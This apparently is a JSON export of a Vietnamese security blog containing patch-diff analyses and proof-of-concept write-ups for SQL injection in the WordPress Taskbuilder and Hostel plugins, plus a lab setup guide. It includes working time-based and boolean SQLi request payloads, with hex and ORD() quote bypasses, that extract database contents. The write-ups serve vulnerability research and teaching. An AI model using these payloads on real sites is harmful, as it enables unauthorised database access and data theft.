[{"content":"Introduction Lỗ hổng xảy ra trên plugin Taskbuilder của WordPress trước phiên bản 4.0.2. Điều này có thể cho phép kẻ tấn công trực tiếp tương tác với cơ sở dữ liệu của bạn, bao gồm không giới hạn ở việc đánh cắp thông tin.\nCVE ID: CVE-2025-39569 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt; 4.0.2 CVSS severity: High (8.5) Required Privilege: Subscriber Requirements Local WordPress and Debugging Taskbuilder Plugin: v4.0.1(vul) và v4.0.2(fix) diff tool: meld hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version Analysis Ứng dụng đã xử lý dữ liệu đầu vào trước khi đưa vào câu SQL. Tuy nhiên, trong quá trình xây dựng truy vấn, giá trị này được chèn trực tiếp mà không được bao trong dấu nháy đơn '...'. Điều đó khiến kẻ tấn công có thể chèn thêm các thành phần cú pháp SQL hợp lệ (như OR, AND,...) vào truy vấn, dẫn đến lỗ hổng SQL Injection.\nPatch Diff Dùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá. Có sự khác biệt rõ ở file includes/admin/projects/get_users.php\nTrong phiên bản v4.0.1, biến $proj_id sau khi escape được đưa thẳng vào câu truy vấn mà không có dấu nháy đơn bao quanh:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = $proj_id\u0026#34; ); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.1\u0026rdquo; }\nỞ bản v4.0.2, truy vấn đã được điều chỉnh bằng cách đặt $proj_id trong dấu nháy đơn sau khi escape:\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row( \u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project where id = \u0026#39;$proj_id\u0026#39;\u0026#34; ); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.2\u0026rdquo; }\nBản vá này đảm bảo rằng giá trị $proj_id sau khi escape được coi là một chuỗi literal, không thể thoát ra khỏi dấu nháy đơn để chèn thêm cú pháp SQL, qua đó ngăn chặn tấn công SQL Injection.\nHow it work? File architecture:\nCấu trúc chung của file hiện tại\n$proj_id = esc_sql($proj_id); $project = $wpdb-\u0026gt;get_row(\u0026#34;SELECT * FROM {$wpdb-\u0026gt;prefix}wppm_project WHERE id = $proj_id\u0026#34;); // Bắt đầu buffer để tạo nội dung chính (body) của modal ob_start(); // ... render HTML danh sách users $body = ob_get_clean(); // Bắt đầu buffer để tạo phần footer của modal ob_start(); // ... render HTML các nút thao tác (Close, Save) $footer = ob_get_clean(); // Trả dữ liệu JSON để frontend hiển thị modal echo json_encode([ \u0026#39;body\u0026#39; =\u0026gt; $body, \u0026#39;footer\u0026#39; =\u0026gt; $footer, ]); {: file=\u0026ldquo;includes/admin/projects/get_users.php v4.0.1\u0026rdquo; }\n$proj_id / $project: Lấy dữ liệu project từ database. ob_start() / ob_get_clean(): Ghi HTML ra buffer thay vì xuất trực tiếp, giúp gom nội dung vào biến. $body / $footer: Chứa nội dung HTML động của modal. json_encode(): Trả JSON cho client, có khả năng được sử dụng trong Ajax để hiển thị modal mà không cần refresh trang. File nằm trong thư mục includes cho thấy rằng nó sẽ được gọi ở 1 chức năng nào đó ở nơi khác. Để biết chức năng nào sử dụng nó, ta tìm kiếm với từ khóa get_users.php trong thư mục chứa plugin.\n👉 Nó được include trong hàm wppm_get_users() của class WPPM_Admin trong file class-wppm-admin.php. wppm_get_users() là callback của action hook trong WordPress.\nWPPM_Admin construct:\nfinal class WPPM_Admin { // constructor public function __construct() { // other action add_action( \u0026#39;wp_ajax_wppm_get_users\u0026#39;,array($this,\u0026#39;wppm_get_users\u0026#39;)); // array($this,\u0026#39;wppm_get_users\u0026#39;)) = $this::wppm_get_users() // other action } } {: file=\u0026ldquo;includes/class-wppm-admin.php v4.0.1\u0026rdquo; }\nadd_action() là một Plugin API của WordPress, cho phép gắn một callback vào một action hook. wp_ajax_wppm_get_users là tên hook Ajax, với quy tắc đặt tên: wp_ajax_{action} =\u0026gt; Xử lý Ajax khi user đã đăng nhập. wp_ajax_nopriv_{action} =\u0026gt; Xử lý Ajax khi user chưa đăng nhập. Ở đây, action = wppm_get_users. Nghĩa là nếu trong Ajax request bạn gửi action=wppm_get_users tới admin-ajax.php, thì WordPress sẽ tìm callback tương ứng để xử lý, ở đây là wppm_get_users(). 👉 Ta đã biết được action = wppm_get_users, kiểm tra xem Ajax nào sử dụng action này bằng cách tìm từ khóa wppm_get_users trên các file .js trong thư mục chứa plugin.\nAction wppm_get_users là phần data trong request POST của hàm wppm_get_users()\nHàm wppm_get_users() sẽ được đặt trong HTML attribute của chức năng project\nTạo project mới Truy cập vào project đó Inspect code và tìm hàm wppm_get_users sẽ được đặt ở đâu, hành động nào sẽ gọi nó 👉 Khi click vào icon bên cạnh Users ajax sẽ hoạt động, gửi request đến server, lấy danh sách các user tham gia project và mã HTML hiển thị nó.\nExploit Detect SQLi Bắt request bằng BurpSuite, gửi request với SQLi payload time base\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+SLEEP(1)) Thời gian phản hồi bị delay =\u0026gt; SQL Injection thành công.\nGet First Letter of Database Name Điều kiện tiên quyết để dump được hết data là phải dump được 1 ký tự bất kỳ của tên database, nếu lấy được thì toàn bộ data đều dump được.\nGửi request với SQLi payload boolean base vói proj_id đúng:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,4,999)) Database name được tôi đặt tên là wordpress nên kí tự đầu tiên là w tương ứng với mã HEX là 0x77 {: .prompt-info }\nSử dụng SUBSTRING(STRING,1,1) để lấy kí tự đầu tiên của chuỗi\nỞ đây, $proj_id bằng 4 vì SUBSTRING('wordpress',1,1)=0x77 là đúng nên SELECT lấy giá trị đúng trong IF(condition, value if true, value if false), 4 là giá trị có thực trong database, nên response trả về chứa danh sách người tham gia dự án\nSử dụng HEX technique để bypass hàm esc_sql() ở trên, dùng để so sánh khi không sử dùng được '\nGửi request với SQLi payload boolean base vói proj_id sai:\nPOST /wp-admin/admin-ajax.php HTTP/1.1 ... action=wppm_get_users\u0026amp;proj_id=(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,999,4)) Với proj_id không có thực trong database, response sẽ trả về kết quả chứa None\n👉 Ta đã lấy được kí tự đầu tiên của database name bằng kỹ thuật boolean base\nproj_id đùng: response không chứa None proj_id sai: response chứa None Có thể sử dụng kỹ thuật time base nhưng khi dump số lượng lớn data, thời gian dump sẽ rất lâu {: .prompt-info }\nConclusion Lỗ hổng CVE-2025-39569 trong plugin WordPress Taskbuilder xuất phát từ việc thiếu dấu nháy đơn '...' bao quanh dữ liệu đầu vào trong câu lệnh SQL, khiến dữ liệu người dùng có thể được diễn giải như một phần của câu lệnh SQL hợp lệ.\nBản vá ở phiên bản 4.0.2 đã khắc phục vấn đề bằng cách đưa $proj_id vào trong '...', đảm bảo nó luôn được xử lý như một literal string trong SQL.\nKey takeaways:\nƯu tiên sử dụng prepared statements ($wpdb-\u0026gt;prepare() trong WordPress) thay vì tự chèn dữ liệu vào query. Đối với các plugin WordPress, cần test kỹ lưỡng các Ajax endpoint vì đây là nơi dễ xuất hiện SQLi và XSS nhất. Người quản trị cần thường xuyên cập nhật plugin/theme để nhận bản vá kịp thời. References SQL Injection cheat sheet - PortSwigger\nWordPress Taskbuilder project mnagement tool Plugin \u0026lt;= 4.0.1 is vulnerable to SQL Injection\n","permalink":"//localhost:1313/vi/posts/2025-09-22-cve-2025-39569/","summary":"\u003ch2 id=\"introduction\"\u003eIntroduction\u003c/h2\u003e\n\u003cp\u003eLỗ hổng xảy ra trên plugin \u003cstrong\u003eTaskbuilder\u003c/strong\u003e của WordPress trước phiên bản \u003cstrong\u003e4.0.2\u003c/strong\u003e. Điều này có thể cho phép kẻ tấn công trực tiếp tương tác với cơ sở dữ liệu của bạn, bao gồm không giới hạn ở việc đánh cắp thông tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39569\"\u003eCVE-2025-39569\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/taskbuilder/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt; 4.0.2\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: High (8.5)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Subscriber\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/posts/wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eTaskbuilder Plugin\u003c/strong\u003e:  v4.0.1(vul) và v4.0.2(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoặc bất cứ tool nào có thể compare để thấy được sự khác biệt giữa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eỨng dụng đã \u003cstrong\u003exử lý dữ liệu đầu vào\u003c/strong\u003e trước khi đưa vào câu SQL. Tuy nhiên, trong quá trình xây dựng truy vấn, giá trị này được chèn trực tiếp mà không được bao trong dấu nháy đơn \u003ccode\u003e'...'\u003c/code\u003e. Điều đó khiến kẻ tấn công có thể chèn thêm các thành phần cú pháp SQL hợp lệ (như \u003ccode\u003eOR\u003c/code\u003e, \u003ccode\u003eAND\u003c/code\u003e,\u003ccode\u003e...\u003c/code\u003e) vào truy vấn, dẫn đến lỗ hổng SQL Injection.\u003c/p\u003e","title":"CVE-2025-39569 Analysis \u0026 POC"},{"content":"Lỗ hổng trong plugin Hostel trước phiên bản 1.1.5.7. Do việc làm sạch dữ liệu không đúng cách, điều này có thể cho phép kẻ tấn công trực tiếp tương tác với cơ sở dữ liệu, bao gồm không giới hạn ở việc đánh cắp thông tin.\nCVE ID: CVE-2025-39566 Product: WordPress Hostel Plugin Vulnerability Type: SQL Injection Affected Versions: \u0026lt;= 1.1.5.6 CVSS severity: 7.6 (High) Required Privilege: Administrator Requirements Local WordPress and Debugging Hostel Plugin: v1.1.5.6(vul) và v1.1.5.7(fix) diff tool: meld hoặc bất cứ tool nào có thể compare để tháy được sự khác biệt giữa 2 version Analysis Nguyên nhân cố lõi do ứng dụng chèn trực tiếp dữ liệu từ GET request vào SQL query mà cơ chế kiểm soát không chặt chẽ.\nPatch Diff Dùng diff tool bất kì để so sánh sự khác biệt giữa bản lỗi và bản vá. Có sự khác biệt rõ ở file controllers/bookings.php\nBản lỗ hổng:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } Bản vá:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) { $ob = sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]); if(!in_array($ob, [\u0026#39;tB.id\u0026#39;, \u0026#39;tB.contact_name\u0026#39;, \u0026#39;tB.contact_email\u0026#39;, \u0026#39;tB.from_date\u0026#39;, \u0026#39;tB.amount_paid\u0026#39;, \u0026#39;tB.status\u0026#39;])) { $ob = \u0026#39;tB.id\u0026#39;; } $orderby = \u0026#34;ORDER BY $ob $dir\u0026#34;; } 👉 Bản vá sử dụng whitelist để giới hạn các cột có thể được sắp xếp, nếu không hợp lệ trả về 'tB.id'.\nAnalysis: Lỗ hổng xuất hiện khi param ob được truyền trực tiếp vào mệnh đề ORDER BY thông qua hàm sanitize_text_field(), chỉ escape mà không filter SQLi.\nHow it work? Để inject được, ta cần phải xác định toàn bộ câu query được được sử dụng ở đây\n$bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); Câu query nằm trong nhánh default của cấu trúc switch.\nToàn bộ đoạn xử lý naỳ thuộc về hàm static manage() của class WPHostelBookings.\nclass WPHostelBookings { static function manage() { global $wpdb; $_booking = new WPHostelBooking(); switch(@$_GET[\u0026#39;do\u0026#39;]) { case \u0026#39;add\u0026#39;: // add handle break; case \u0026#39;edit\u0026#39;: // edit handle break; // view/print booking details. Will allow also to confirm/cancel case \u0026#39;view\u0026#39;: // view handle\tbreak;\t// list bookings default: // another logic if(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } $bookings = $wpdb-\u0026gt;get_results(\u0026#34;SELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM \u0026#34;.WPHOSTEL_BOOKINGS.\u0026#34; tB JOIN \u0026#34;.WPHOSTEL_ROOMS.\u0026#34; tR ON tR.id = tB.room_id WHERE is_static=0 $where_sql $orderby $limit_sql\u0026#34;); // another logic break; } } } Trong WordPress, plugin giao tiếp với core thông qua Plugin API (Hook System). Do đó, để xác định nơi hàm manage() được gọi, ta có thể tìm kiếm từ khóa \u0026quot;manage\u0026quot; trong thư mục chứa plugin.\nTrong file models/hostel.php ta có hàm:\nclass class WPHostel { // another logic static function menu() { // we use \u0026#39;hostelpro_manage\u0026#39; for consistency with the pro version $wphostel_caps = current_user_can(\u0026#39;manage_options\u0026#39;) ? \u0026#39;manage_options\u0026#39; : \u0026#39;hostelpro_manage\u0026#39;; add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Settings\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Rooms\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_rooms\u0026#39;, array(\u0026#39;WPHostelRooms\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Unavailable Dates\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_unavailable\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;unavailable\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Email Log\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_emaillog\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;email_log\u0026#34;)); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Help\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_help\u0026#39;, array(\u0026#39;WPHostelHelp\u0026#39;, \u0026#34;index\u0026#34;)); } // another logic } Ở đây:\nadd_menu_page() tạo menu chính trong Admin Dashboard. add_submenu_page() thêm các submenu con cho menu đó. Tham số $callback là một callback function sẽ được gọi khi người dùng click vào menu/submenu. Ví dụ:\n// add_menu_page($page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;, $icon_url = \u0026#39;\u0026#39;, $position = null); add_menu_page(__(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), __(\u0026#39;Hostel\u0026#39;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#34;wphostel_options\u0026#34;, array(__CLASS__, \u0026#34;options\u0026#34;)); // add_submenu_page($parent_slug, $page_title, $menu_title, $capability, $menu_slug, $callback = \u0026#39;\u0026#39;); add_submenu_page(\u0026#39;wphostel_options\u0026#39;, __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), __(\u0026#34;Manage Bookings\u0026#34;, \u0026#39;wphostel\u0026#39;), $wphostel_caps, \u0026#39;wphostel_bookings\u0026#39;, array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); // array(\u0026#39;WPHostelBookings\u0026#39;, \u0026#34;manage\u0026#34;)); =\u0026gt; WPHostelBookings::manage() Tất cả menu/submenu này đều được đăng ký bên trong hàm static menu() của class WPHostel. Do đó, để xác định nơi hàm menu() được gọi, ta có thể tìm kiếm từ khóa menu trong thư mục chứa plugin.\nTrong file hostel.php ở thư mục gốc của plugin ta có:\nadd_action(\u0026#39;admin_menu\u0026#39;, array(\u0026#34;WPHostel\u0026#34;, \u0026#34;menu\u0026#34;)); // =\u0026gt; callback: WPHostel::menu() add_action() là một Plugin API của WordPress, cho phép gắn một callback vào một action hook. Hook name ở đây là admin_menu, nghĩa là hàm WPHostel::menu() sẽ được gọi trong vòng đời khi WordPress dựng Admin Dashboard Menu. Menu trên UI Admin Dashboard\nDebugging\nChức năng bị lỗi nằm trong Booking Manager, vì vậy ta truy cập vào submenu Manager Bookings trên UI Admin Dashboard. Ngay trước nhánh default có comment // list bookings =\u0026gt; cho thấy đoạn code này xử lý việc liệt kê và sắp xếp bookings Mở debugger: Click Run with Debugger. Đặt breakpoint tại nhánh switch chứa code lỗi và tại dòng code gây lỗi. Khi click vào một cột trong bảng bookings, quan sát: Debugger nhảy vào cấu trúc switch. Dùng Step Over, debugger đi tiếp vào nhánh default. Tiếp tục Step Over và theo dõi giá trị biến trong tab Variables \u0026gt; Locals. Các biến này sẽ kết hợp để tạo thành câu SQL bên dưới. Sau khi ghép các biến, câu query đầy đủ có dạng:\nSELECT SQL_CALC_FOUND_ROWS tB.*, tR.title as room FROM wp_hostel_bookings tB JOIN wp_hostel_rooms tR ON tR.id = tB.room_id WHERE is_static=0 AND tB.id = ... ORDER BY tB.amount_paid ASC|DESC LIMIT ... Đáng chú ý, biến $orderby được gán như sau:\nif(!empty($_GET[\u0026#39;ob\u0026#39;])) {\t$orderby = \u0026#34;ORDER BY \u0026#34;.sanitize_text_field($_GET[\u0026#39;ob\u0026#39;]) . \u0026#39; \u0026#39; . $dir; } ⚠️ Ở đây có điểm bất thường:\nPhần sau ORDER BY sử dụng sanitize_text_field(). Hàm này chỉ làm sạch HTML, không hề filter hoặc validate để đảm bảo an toàn trong SQL context. Tham số ob (do người dùng truyền vào) vì vậy có thể bị lợi dụng để chèn trực tiếp vào câu SQL. Exploit Detect SQLi Request with BurpSuite:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=upcoming\u0026amp;ob=tB.status,(SELECT+SLEEP(10))\u0026amp;dir=ASC HTTP/1.1 Ta tách mệnh đề ORDER BY bằng , vì nó chấp nhập multi column\nKết quả: thời gian phản hồi bị delay =\u0026gt; SQL Injection thành công.\nDump Data from Database Bypass ' using ORD():\nĐể dump dữ liệu của database ta cần thử để lấy ký tự đầu tiên của database name.\nDo sanitize_text_field() loại bỏ ', ta không dùng được payload so sánh trực tiếp. Thay vào đó dùng ORD() để so sánh ký tự theo ASCII:\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(ORD(SUBSTRING(DATABASE(),1,1))=119,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Thành công bypass =\u0026gt; có thể trích xuất tên database.\nBypass ' using Hex encoding (extend)\nNgoài ORD() ta có thể sử dụng Hex encoding để bypass\nGET /wp-admin/admin.php?page=wphostel_bookings\u0026amp;type=past\u0026amp;ob=tB.status,(SELECT+IF(SUBSTRING(DATABASE(),1,1)=0x77,SLEEP(5),0))\u0026amp;dir=ASC HTTP/1.1 Thành công bypass =\u0026gt; có thể trích xuất tên database.\nConclusion Lỗ hổng CVE-2025-39566 trong plugin WordPress Hostel trước phiên bản 1.1.5.7, xuất phát từ việc truyền trực tiếp input từ người dùng vào SQL query mà không có biện pháp kiểm soát chặt chẽ dẫn đến lỗ hổng SQL Injection.\nKey takeaways:\nsanitize_text_field() ≠ chống SQL Injection Cần phân biệt rõ: lọc input cho HTML vs cho SQL References SQL Injection Cheat Sheet – PortSwigger\nWordPress Hostel Plugin \u0026lt;= 1.1.5.6 is vulnerable to SQL Injection - patchstack\n","permalink":"//localhost:1313/vi/posts/2025-09-21-cve-2025-39566/","summary":"\u003cp\u003eLỗ hổng trong plugin \u003cstrong\u003eHostel\u003c/strong\u003e trước phiên bản \u003cstrong\u003e1.1.5.7\u003c/strong\u003e. Do việc làm sạch dữ liệu không đúng cách, điều này có thể cho phép kẻ tấn công trực tiếp tương tác với cơ sở dữ liệu, bao gồm không giới hạn ở việc đánh cắp thông tin.\u003c/p\u003e\n\u003cul\u003e\n\u003cli\u003e\u003cstrong\u003eCVE ID\u003c/strong\u003e: \u003ca href=\"https://www.cve.org/CVERecord?id=CVE-2025-39566\"\u003eCVE-2025-39566\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eProduct\u003c/strong\u003e: \u003ca href=\"https://wordpress.org/plugins/hostel/\"\u003eWordPress Hostel Plugin\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eVulnerability Type\u003c/strong\u003e: SQL Injection\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eAffected Versions\u003c/strong\u003e: \u0026lt;= 1.1.5.6\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eCVSS severity\u003c/strong\u003e: 7.6 (High)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eRequired Privilege\u003c/strong\u003e: Administrator\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"requirements\"\u003eRequirements\u003c/h2\u003e\n\u003cul\u003e\n\u003cli\u003e\u003ca href=\"https://w41bu1.github.io/blog/posts/2025-09-20-wordpress-local-and-debugging/\"\u003e\u003cstrong\u003eLocal WordPress and Debugging\u003c/strong\u003e\u003c/a\u003e\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003eHostel Plugin\u003c/strong\u003e:  v1.1.5.6(vul) và v1.1.5.7(fix)\u003c/li\u003e\n\u003cli\u003e\u003cstrong\u003ediff tool\u003c/strong\u003e: \u003cstrong\u003emeld\u003c/strong\u003e hoặc bất cứ tool nào có thể compare để tháy được sự khác biệt giữa 2 version\u003c/li\u003e\n\u003c/ul\u003e\n\u003chr\u003e\n\u003ch2 id=\"analysis\"\u003eAnalysis\u003c/h2\u003e\n\u003cp\u003eNguyên nhân cố lõi do ứng dụng chèn trực tiếp dữ liệu từ \u003cstrong\u003eGET\u003c/strong\u003e request vào SQL query mà cơ chế kiểm soát không chặt chẽ.\u003c/p\u003e","title":"CVE-2025-39566 Analysis \u0026 POC"},{"content":"WordPress là một hệ thống quản lý nội dung (CMS) mạnh mẽ và phổ biến nhất cho phép bạn tạo, quản lý và tùy chỉnh các trang web và blog một cách dễ dàng. Nó là open-source CMS, được xây dựng trên PHP và sử dụng cơ sở dữ liệu MySQL hoặc Maria DB.\nRa đời năm 2003, ban đầu chỉ để viết blog, sau đó phát triển thành nền tảng tạo website, cửa hàng online, diễn đàn, landing page… Hiện nay, hơn 40% website trên thế giới chạy bằng WordPress. Có 2 phiên bản WordPress:\nWordPress.com Dịch vụ hosting do Automattic cung cấp Bạn chỉ cần đăng ký tài khoản, không phải cài đặt Hạn chế tùy chỉnh, muốn nâng cao thì phải trả phí WordPress.org Mã nguồn mở, bạn tự tải về và cài đặt lên hosting/server riêng Tùy chỉnh toàn diện, có thể cài plugin, theme, viết code, tạo website theo ý mình Ecosystem Core: CMS chính Plugin: Một phần mềm bổ sung có thể được cài đặt trên trang web WordPress để mở rộng chức năng của nó và thêm các tính năng mới Themes: Một phần mềm bổ sung đại diện cho sự xuất hiện trực quan và bố cục của một trang web WordPress Why WordPress Hacking? State of WordPress Security in 2024\nMost Popular Hiện tại hơn 40% website trên toàn thế giới chạy WordPress Nghĩa là hacker chỉ cần tìm ra một lỗ hổng phổ biến =\u0026gt; có thể khai thác hàng triệu site cùng lúc Giống như “cá nhiều thì chài ở đó” Plugin and Theme WordPress Core đã được xem xét trong 1 thời gian dài bởi hàng ngàn developers và researchers. Kết quả là rất khó để kẻ tấn công có thể đột nhập vào Tuy nhiên, có hàng chục ngàn plugin và theme từ nhiều nguồn, chất lượng không đồng đều được sử dụng Nhiều plugin code bảo mật kém, không còn được cập nhật. Hacker chỉ cần scan plugin/theme để tìm version lỗi thời, rồi khai thác Setup WordPress for Hacking Có rất nhiều cách để setup WorkPress, tìm kiếm bằng Google có thể cung cấp nhiều bài viết về nó. Ở đây tôi sẽ setup trên máy ảo Ubuntu (22.04):\nKhông ảnh hưởng đến các dịch vụ của máy thật WordPress tương đối nhẹ để sử dụng trên máy ảo Install and configure WordPress Install Dependencies Cài toàn bộ stack cần thiết để chạy WordPress (web server + database + PHP + các extension quan trọng).\nsudo apt install apache2 \\ ghostscript \\ libapache2-mod-php \\ mysql-server \\ php \\ php-bcmath \\ php-curl \\ php-imagick \\ php-intl \\ php-json \\ php-mbstring \\ php-mysql \\ php-xml \\ php-zip Install WordPress Tải và cài mã nguồn WordPress vào thư mục web.\n# Tạo folder để lưu trữ mã nguồn website sudo mkdir -p /srv/www # Đổi owner thành www-data, đây là user mặc định của Apache/Nginx để chạy web server # Khi Apache/NGINX khởi động, nó không chạy bằng root (nguy hiểm vì có toàn quyền hệ thống), mà sẽ drop xuống chạy dưới quyền www-data. sudo chown www-data: /srv/www # Tải gói WordPress mới nhất từ trang chính thức # Giải nén vao thưc mục /srv/www được tạo ở trên curl https://wordpress.org/latest.tar.gz | sudo -u www-data tar zx -C /srv/www Có thể tải phiên bản cụ thể bằng:\ncurl https://wordpress.org/wordpress-6.6.2.tar.gz | sudo -u www-data tar zx -C /srv/www Cài từ wordpress.org là cách chuẩn nhất và ít rủi ro:\nUbuntu có sẵn package wordpress trong repo. Nhưng nó thường cũ hơn nhiều so với bản chính thức trên wordpress.org Cộng đồng WordPress chỉ hỗ trợ khi bạn dùng bản chính thức từ wordpress.org, vì nếu bạn gặp lỗi do package của Ubuntu thì họ không giải quyết được. Configure Apache for WordPress Tạo file /etc/apache2/sites-available/wordpress.conf cấu hình Apache cho WordPress:\n# Lắng nghe trên tất cả địa chỉ IP (*) tại port 80 (HTTP). \u0026lt;VirtualHost *:80\u0026gt; # Thư mục gốc của website (nơi chứa mã nguồn WordPress). DocumentRoot /srv/www/wordpress \u0026lt;Directory /srv/www/wordpress\u0026gt; Options FollowSymLinks # Cho phép file .htaccess ghi đè một số thiết lập liên quan đến bảo mật và URL rewriting. AllowOverride Limit Options FileInfo # Khi truy cập thư mục, Apache sẽ tìm file index.php để hiển thị. DirectoryIndex index.php # Cho phép tất cả mọi người truy cập (cần cho website public). Require all granted \u0026lt;/Directory\u0026gt; # Riêng thư mục wp-content (chứa plugin, theme, upload) cũng cho phép truy cập. \u0026lt;Directory /srv/www/wordpress/wp-content\u0026gt; Options FollowSymLinks Require all granted \u0026lt;/Directory\u0026gt; \u0026lt;/VirtualHost\u0026gt; Kích hoạt site WordPress:\nsudo a2ensite wordpress a2ensite = enable site config (tạo symlink từ /etc/apache2/sites-available/wordpress.conf sang /etc/apache2/sites-enabled/) Sau đó site wordpress sẽ được Apache load khi restart. Kích hoạt module rewrite:\nsudo a2enmod rewrite WordPress cần module mod_rewrite để hỗ trợ Pretty Permalinks (ví dụ /blog/hello-world/ thay vì ?p=123) Vô hiệu hóa site mặc định (Option):\nsudo a2dissite 000-default Apache mặc định có site 000-default.conf (chỉ hiển thị \u0026ldquo;It works!\u0026rdquo;) Nếu không disable, site mặc định có thể chiếm port 80 trước WordPress 👉 Hoặc nếu không muốn disable, có thể thêm ServerName vào VirtualHost WordPress để Apache phân biệt 